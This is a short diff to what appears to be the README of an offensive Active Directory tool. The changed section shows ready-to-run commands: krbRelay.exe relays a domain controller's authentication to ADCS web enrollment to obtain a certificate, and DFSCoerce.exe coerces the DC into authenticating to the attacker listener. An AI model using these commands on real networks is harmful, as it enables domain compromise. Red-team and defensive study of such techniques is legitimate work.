@@ -21,7 +21,7 @@ This is a quick & dirty adaptation from original project, leaving cleanup and op
 ````
 # Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a linux box redirecting to windows attacker machine on port 9999:<br>
 krbRelay.exe -spn http/adcs-mylab.mylab.local -redirecthost adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -endpoint certsrv  -adcs DomainController -listenerport 9999<br>
-In another window:
+#In another window:
 DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
 (https://github.com/decoder-it/DFSCoerce-exe-2)
 
